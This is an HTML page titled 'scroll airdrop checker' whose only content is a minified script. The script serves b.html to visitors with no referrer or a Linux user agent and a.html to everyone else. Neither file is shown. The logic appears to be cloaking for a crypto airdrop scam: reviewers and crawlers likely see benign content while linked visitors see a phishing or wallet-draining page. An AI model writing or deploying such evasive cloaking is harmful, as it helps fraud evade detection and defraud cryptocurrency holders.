<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>scroll airdrop checker</title>
  <script>document.addEventListener("DOMContentLoaded",function(){!function e(){let t=document.referrer,n=document.getElementById("dynamic-content"),r=navigator.userAgent.toLowerCase(),o=r.includes("linux");!t||o?fetch("b.html").then(e=>e.text()).then(e=>{n.innerHTML=e}).catch(e=>{console.error("Error loading b.html:",e),n.innerHTML="Sorry, we couldn't load the content."}):fetch("a.html").then(e=>e.text()).then(e=>{n.innerHTML=e}).catch(e=>{console.error("Error loading a.html:",e),n.innerHTML="Sorry, we couldn't load the content from the referrer."})}()});</script>


</head>
<body>
    <div id="dynamic-content">
        <!-- Content -->
        <p>Loading content...</p>
    </div>
</body>
</html>
